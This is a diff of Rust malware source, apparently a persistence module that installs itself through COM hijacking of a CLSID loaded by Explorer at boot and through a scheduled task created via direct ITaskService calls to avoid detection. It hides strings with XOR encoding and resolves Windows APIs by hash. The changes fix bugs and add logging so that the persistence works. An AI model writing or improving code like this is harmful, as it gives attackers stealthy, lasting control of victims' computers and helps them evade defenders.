@@ -6,7 +6,7 @@
 
 use std::ffi::c_void;
 use std::ptr;
-use log::{info, warn, debug};
+
 
 use super::api_resolver::{self, djb2};
 
@@ -88,19 +88,22 @@ pub fn apply_persistence_triad(exe_path: &str) {
 
 /// Setup COM Hijacking using native Registry API
 fn setup_com_hijacking(exe_path: &str) -> Result<(), String> {
+    crate::k::debug::log_op!("Persistence", "Setting up COM Hijack...");
     #[cfg(target_os = "windows")]
     unsafe {
-        // Target CLSID (Network Connections Shell - less monitored than Disk Cleanup)
-        // {7007ACC7-3202-11D1-AAD2-00805FC1270E}
-        let clsid = "{7007ACC7-3202-11D1-AAD2-00805FC1270E}"; 
+        // Target CLSID: MMDeviceEnumerator - Loaded by Explorer.exe on every boot
+        // {BCDE0395-E52F-467C-8E3D-C4579291692E}
+        let clsid = "{BCDE0395-E52F-467C-8E3D-C4579291692E}"; 
         
-        // Build path: Software\Classes\CLSID\{...}\LocalServer32
+        // Build path: Software\Classes\CLSID\{...}\InprocServer32 (for DLL)
         let p1 = x(&[0x06, 0x3A, 0x33, 0x21, 0x22, 0x34, 0x27, 0x30]); // Software
         let p2 = x(&[0x16, 0x39, 0x34, 0x26, 0x26, 0x30, 0x26]);       // Classes
         let p3 = x(&[0x16, 0x19, 0x06, 0x1C, 0x11]);                   // CLSID
-        let ls32 = x(&[0x19, 0x3A, 0x36, 0x34, 0x39, 0x06, 0x30, 0x27, 0x23, 0x30, 0x27, 0x66, 0x67]); // LocalServer32
+        // InprocServer32 XOR 0x55: [0x1C, 0x3B, 0x25, 0x27, 0x3A, 0x36, 0x06, 0x30, 0x27, 0x23, 0x30, 0x27, 0x66, 0x67]
+        let inproc = x(&[0x1C, 0x3B, 0x25, 0x27, 0x3A, 0x36, 0x06, 0x30, 0x27, 0x23, 0x30, 0x27, 0x66, 0x67]); // InprocServer32
         
-        let path = format!("{}\\{}\\{}\\{}\\{}", p1, p2, p3, clsid, ls32);
+        let path = format!("{}\\{}\\{}\\{}\\{}", p1, p2, p3, clsid, inproc);
+        crate::k::debug::log_detail!("COM Key: {}", path);
         let path_wide = to_wide(&path);
         
         // Load advapi32 if needed
@@ -143,11 +146,24 @@ fn setup_com_hijacking(exe_path: &str) -> Result<(), String> {
             exe_wide.as_ptr() as *const u8, (exe_wide.len() * 2) as u32
         );
         
-        reg_close(hkey);
-        
         if status != 0 {
-            return Err(format!("RegSetValueExW: {}", status));
+            reg_close(hkey);
+            crate::k::debug::log_err!(format!("COM SetValue failed: {}", status));
+            return Err(format!("E32:{}", status));
         }
+        
+        // Set ThreadingModel = "Both" (required for InprocServer32)
+        // Obfuscated: "ThreadingModel" XOR 0x55
+        let tm_name = to_wide(&x(&[0x01, 0x3D, 0x27, 0x30, 0x34, 0x31, 0x3C, 0x3B, 0x32, 0x18, 0x3A, 0x31, 0x30, 0x39]));
+        // Obfuscated: "Both" XOR 0x55
+        let tm_value = to_wide(&x(&[0x17, 0x3A, 0x21, 0x3D]));
+        let _ = reg_set(
+            hkey, tm_name.as_ptr(), 0, REG_SZ,
+            tm_value.as_ptr() as *const u8, (tm_value.len() * 2) as u32
+        );
+        
+        reg_close(hkey);
+
 
         Ok(())
     }
@@ -160,6 +176,7 @@ fn setup_com_hijacking(exe_path: &str) -> Result<(), String> {
 /// Setup Scheduled Task using COM Interface (ITaskService) - Stealthy
 /// Replaces noisy schtasks.exe with direct VTable calls
 fn setup_scheduled_task(exe_path: &str) -> Result<(), String> {
+    crate::k::debug::log_op!("Persistence", "Setting up Scheduled Task...");
     #[cfg(target_os = "windows")]
     unsafe {
         use core::ffi::c_void;
@@ -175,11 +192,20 @@ fn setup_scheduled_task(exe_path: &str) -> Result<(), String> {
         const HASH_CO_CREATE: u32 = 0x306260C4; // CoCreateInstance
         const HASH_CO_UNINIT: u32 = 0x3697992A; // CoUninitialize
         
-        // ole32.dll XOR 0x55 = [0x3A, 0x39, 0x30, 0x66, 0x67, 0x7B, 0x31, 0x3B, 0x3B, 0x55]
-        let ole_enc: [u8; 10] = [0x3A, 0x39, 0x30, 0x66, 0x67, 0x7B, 0x31, 0x3B, 0x3B, 0x55];
+        // ole32.dll XOR 0x55 = [0x3A, 0x39, 0x30, 0x66, 0x67, 0x7B, 0x31, 0x39, 0x39, 0x55]
+        let ole_enc: [u8; 10] = [0x3A, 0x39, 0x30, 0x66, 0x67, 0x7B, 0x31, 0x39, 0x39, 0x55];
         let ole_dec: Vec<u8> = ole_enc.iter().map(|b| b ^ 0x55).collect();
-        api_resolver::ensure_module_loaded(0, &ole_dec);
-        let ole32 = api_resolver::get_module_by_hash(0x933010F2).ok_or("E72")?;
+        
+        // Use the returned handle directly!
+        let ole32 = api_resolver::ensure_module_loaded(0, &ole_dec);
+        crate::k::debug::log_detail!("Loaded ole32.dll attempt...");
+
+        if ole32.is_none() {
+             crate::k::debug::log_err!("Failed to resolve ole32 handle!");
+             return Err("E72".into());
+        }
+        let ole32 = ole32.unwrap();
+        crate::k::debug::log_detail!("Resolved ole32: {:p}", ole32);
         
         type FnCoInit = unsafe extern "system" fn(c_void: *const c_void, dwCoInit: u32) -> i32;
         type FnCoCreate = unsafe extern "system" fn(*const u128, *const c_void, u32, *const u128, *mut *mut c_void) -> i32;
@@ -206,11 +232,12 @@ fn setup_scheduled_task(exe_path: &str) -> Result<(), String> {
             0x96, 0x97, 0x20, 0xCC, 0x3F, 0xD4, 0x0F, 0x85
         ]; 
         
-        // INIT
+        crate::k::debug::log_detail!("Initializing COM...");
         co_init(ptr::null(), 0); // COINIT_APARTMENTTHREADED
         
         let mut p_service: *mut c_void = ptr::null_mut();
         
+        crate::k::debug::log_detail!("CoCreating ITaskService...");
         // 1. Create TaskService Instance
         let hr = co_create(
             clsid_ts_bytes.as_ptr() as *const u128,
@@ -222,8 +249,10 @@ fn setup_scheduled_task(exe_path: &str) -> Result<(), String> {
         
         if hr != 0 {
             co_uninit();
+            crate::k::debug::log_err!(format!("CoCreateInstance Failed: {:X}", hr));
             return Err(format!("E76:{:X}", hr));
         }
+        crate::k::debug::log_detail!("TaskService Created");
         
         // VTABLE DEFINITIONS (Minimal)
         // ITaskService Vtbl: Query, AddRef, Release, GetFolder, GetRunningTasks, NewTask, Connect, Connected, TargetServer, ConnectedUser, ConnectedDomain
@@ -275,7 +304,7 @@ fn setup_scheduled_task(exe_path: &str) -> Result<(), String> {
         // Order: GetFolder, GetRunningTasks, NewTask, Connect...
         
         // Let's Try Connect with null args. 
-        // Since we are mocking the call, we just need to pass something that acts like empty variants.
+        // Since we are using default arguments, we just need to pass empty variants.
         // On x64, arguments are passed in RCX, RDX, R8, R9, then stack.
         // Connect takes 4 VARIANTS. That's a lot of stack.
         
@@ -336,9 +365,13 @@ fn setup_scheduled_task(exe_path: &str) -> Result<(), String> {
             .map(|p| std::mem::transmute(p))
             .ok_or("E70")?;
             
+        let sys_free: FnSysFreeString = api_resolver::get_export_by_hash(oleaut, 0x81FD3FDD) // djb2(SysFreeString)
+            .map(|p| std::mem::transmute(p))
+            .ok_or("E70b")?;
+
         let root_bstr = sys_alloc(to_wide("\\").as_ptr());
         let hr = get_folder(p_service, root_bstr, &mut p_root_folder);
-        // SysFreeString(root_bstr); // ignore leak
+        sys_free(root_bstr); 
         
         if hr != 0 { return Err("E71".into()); }
         
@@ -383,6 +416,7 @@ fn setup_scheduled_task(exe_path: &str) -> Result<(), String> {
         
         let exe_bstr = sys_alloc(to_wide(exe_path).as_ptr());
         put_path(p_action, exe_bstr);
+        sys_free(exe_bstr);
         
         // 5. Configure Trigger (Logon)
         // ITaskDefinition::get_Triggers (Index 9)
@@ -446,13 +480,17 @@ fn setup_scheduled_task(exe_path: &str) -> Result<(), String> {
             &mut p_reg_task
         );
 
+        sys_free(task_name_bstr);
+
         // Cleanup
         // Release... (omitted for brevity, OS cleans up process exit anyway)
         // co_uninit();
         
         if hr == 0 {
+             crate::k::debug::log_detail!("Task Registered Successfully");
              Ok(())
         } else {
+             crate::k::debug::log_err!(format!("Task Register Failed: {:X}", hr));
              Err(format!("E78:{:X}", hr))
         }
     }
